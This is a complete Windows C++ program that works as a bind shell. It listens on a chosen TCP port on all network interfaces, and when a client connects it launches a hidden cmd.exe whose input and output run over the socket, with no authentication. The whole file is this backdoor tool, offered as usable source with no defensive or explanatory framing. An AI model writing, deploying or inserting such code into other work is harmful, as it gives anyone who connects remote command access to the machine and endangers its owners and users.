#include <iostream>
#include <WS2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: %s <LPORT>\n", argv[0]);
		return 1;
	}

	const int lport = atoi(argv[1]);

	if (lport <= 0 || lport > 65535)
	{
		printf("Invalid port\n");
		return 2;
	}

	WSADATA wsaData;
	SOCKADDR_IN addr;
	SOCKET socketServer, socketClient;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WCHAR wszCmd[256] = L"cmd";

	if (!WSAStartup(MAKEWORD(2, 0), &wsaData))
	{
		socketServer = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = htonl(INADDR_ANY); // Set to INADDR_LOOPBACK to listen on 127.0.0.1 only 
		addr.sin_port = htons(lport);

		if (!bind(socketServer, (SOCKADDR*)&addr, sizeof(SOCKADDR_IN)))
		{
			listen(socketServer, SOMAXCONN);
			socketClient = accept(socketServer, 0, 0);

			memset(&si, 0, sizeof(si));
			si.cb = sizeof(si);
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			si.hStdOutput = (HANDLE)socketClient;
			si.hStdError = (HANDLE)socketClient;
			si.hStdInput = (HANDLE)socketClient;

			CreateProcess(NULL, wszCmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

			WaitForSingleObject(pi.hProcess, INFINITE);

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);

			closesocket(socketClient);
		}

		closesocket(socketServer);
	}

	return 0;
}

